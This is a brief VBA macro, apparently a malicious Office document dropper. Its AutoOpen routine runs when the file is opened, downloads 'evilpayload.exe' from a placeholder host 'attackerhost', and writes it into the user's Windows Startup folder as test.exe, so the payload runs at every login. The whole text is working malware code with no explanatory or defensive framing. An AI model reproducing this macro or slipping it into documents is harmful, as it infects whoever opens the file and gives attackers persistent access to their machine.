Sub AutoOpen()

spath = CreateObject("WScript.Shell").SpecialFolders("Startup")
Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
xHttp.Open "GET", "https://attackerhost/evilpayload.exe", False
xHttp.Send
With bStrm
    .Type = 1
    .Open
    .write xHttp.responseBody
    .savetofile spath & "\test.exe", 2
End With

End Sub
